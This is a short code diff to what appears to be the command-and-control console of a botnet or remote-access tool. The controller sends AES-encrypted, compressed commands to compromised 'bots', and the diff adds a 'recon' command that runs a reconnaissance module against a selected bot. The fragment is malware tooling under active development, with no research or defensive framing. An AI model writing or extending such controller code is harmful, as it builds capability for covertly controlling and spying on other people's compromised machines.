@@ -6,6 +6,7 @@ import zlib
 from colorama import Fore, Style, init
 from utils import aes_crypto, key_exchange
 from utils.helpers import print_ascii_art, log_command
+from modules.recon import run_quick_recon
 
 init(autoreset=True)
 
@@ -82,6 +83,10 @@ def control_bot(bot):
 
         if cmd.lower() == "back":
             break
+        
+        if cmd.lower() == "recon":
+            run_quick_recon(bot)
+            continue
 
         try:
             encrypted_cmd = aes_crypto.encrypt(zlib.compress(cmd.encode()), bot['key'])
